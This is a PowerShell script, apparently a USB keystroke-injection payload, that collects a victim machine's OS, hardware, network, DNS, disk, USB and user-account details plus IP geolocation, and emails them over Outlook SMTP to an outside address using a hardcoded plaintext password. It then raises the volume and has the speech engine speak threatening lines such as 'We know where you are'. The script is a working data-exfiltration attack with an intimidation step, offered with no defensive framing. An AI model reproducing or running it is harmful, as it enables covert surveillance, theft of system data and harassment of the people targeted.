
Try {
    $SystemInfo = [PSCustomObject]@{
        OS_Details = Get-WmiObject -Class Win32_OperatingSystem | Select-Object Caption, Version, ServicePackMajorVersion, OSArchitecture
        System_Details = Get-WmiObject -Class Win32_ComputerSystem | Select-Object Model, Manufacturer, SystemType, TotalPhysicalMemory
        IP_Configuration = Get-NetIPAddress | Select-Object IPAddress, InterfaceAlias, AddressFamily
        Network_Adapters = Get-NetAdapter | Select-Object Name, Status, MacAddress, LinkSpeed
        DNS_Configuration = Get-DnsClientServerAddress | Select-Object InterfaceAlias, ServerAddresses
        CPU_Info = Get-WmiObject -Class Win32_Processor | Select-Object Name, NumberOfCores, MaxClockSpeed
        Disk_Info = Get-WmiObject -Class Win32_LogicalDisk | Select-Object DeviceID, VolumeName, Size, FreeSpace
        USB_Devices = Get-WmiObject -Class Win32_USBHub | Select-Object Name, DeviceID, Status
        User_Accounts = Get-LocalUser | Select-Object Name, Enabled, LastLogon
        Logged_On_Users = Get-CimInstance -ClassName Win32_ComputerSystem | Select-Object -ExpandProperty UserName
    }
    $SystemInfoJson = $SystemInfo | ConvertTo-Json -Depth 10
    $ipInfo = Invoke-RestMethod -Uri 'http://ipinfo.io/json'
    $jsonContent = $ipInfo | ConvertTo-Json -Depth 10
    $Message = "Geolocation Data:`r`n$jsonContent`r`n`r`nSystem Information:`r`n$SystemInfoJson"
    $EmailFrom = "usulmadhi@outlook.fr"
    $EmailTo = "UsulMadhi@proton.me"
    $Subject = "Geo Data Ducky"
    $Body = $Message
    $SMTPServer = "smtp.outlook.com"
    $SMTPClient = New-Object Net.Mail.SmtpClient($SMTPServer, 587)
    $SMTPClient.EnableSsl = $true
    $SMTPClient.Credentials = New-Object System.Net.NetworkCredential("usulmadhi@outlook.fr", "Eusebe2000")
    $SMTPClient.Send($EmailFrom, $EmailTo, $Subject, $Body)
    Write-Host "Email sent successfully!"
}

Catch {
    Write-Host "Error sending email: $_"
}

$k=[Math]::Ceiling(100/2);$o=New-Object -ComObject WScript.Shell;for($i = 0;$i -lt $k;$i++){$o.SendKeys([char] 175)}
$s=New-Object -ComObject SAPI.SpVoice
$s.Rate = -2
$s.Speak("We found you")
$s.Speak("We know where you are")
$s.Speak("We are everywhere")
$s.Speak("Expect us")
